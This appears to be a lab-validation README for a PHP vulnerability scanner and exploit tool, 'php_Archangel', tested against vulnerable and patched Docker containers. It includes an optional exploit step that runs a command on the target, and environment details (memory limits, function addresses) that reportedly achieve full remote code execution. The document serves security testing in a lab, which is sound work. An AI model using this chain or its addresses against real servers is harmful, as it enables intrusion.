# php_Archangel Lab Validation

| Port | Image | Expected |
|---|---|---|
| 8088 | php:8.4.26-apache (last vulnerable) | PROBABLE -> CONFIRMED with --auto-confirm |
| 8089 | php:8.4.27-apache (patched) | CLEAN (oracle graceful at both steps) |

## Run

    cd lab && docker compose up -d
    docker compose exec archangel-target php -v
    cd ..
    php_archangel scan http://127.0.0.1:8088/index.php --auto-confirm
    php_archangel scan http://127.0.0.1:8089/index.php --auto-confirm

## Expected, stage by stage (8088)

1. entry: Apache, X-Powered-By PHP/8.4.26 (weak evidence), SAPI=mod_php
2. version reconcile: ~8.4.26
3. OOM oracle: step1=0/502, step2=0/502 (both worker aborts) ->
   CVE-2026-109618 CONFIRMED
4. patch-floor finding appears (8.4.26 behind 8.4.27 branch)

For 8089: both oracle steps graceful -> CLEAN on both CVEs; patch-floor
class still reports (8.4.27 fixed only the two GHSAs).

## Exploit gate (optional, manual)

    php_archangel scan http://127.0.0.1:8088/index.php --auto-confirm
    # answer [1] at the exploit prompt (default cmd: id>/tmp/a1)
    docker compose -f lab/docker-compose.yml exec archangel-target cat /tmp/a1

If chain fires but no /tmp/a1: check memory_limit (default 128M on this
image) — needs 8M-era limits or --huge-mb 130.

## Validated environment (2026-10-23) — REQUIRED for reproduction
- php:8.4.26-apache (BuildID a534a5c4...), php:8.4.27-apache control
- memory_limit=8M, post_max_size=64M, upload_max_filesize=64M (conf.d/99-archangel.ini)
- Apache prefork pinned to 1 worker (conf-enabled/99-single-worker.conf), opcache ON
- Profile 'bookworm-oct21': zval_ptr_dtor=0x65EB60, zif_system=0x465370 (nm-verified)
- Result: full RCE as www-data; workers segfault post-execution (expected signature)
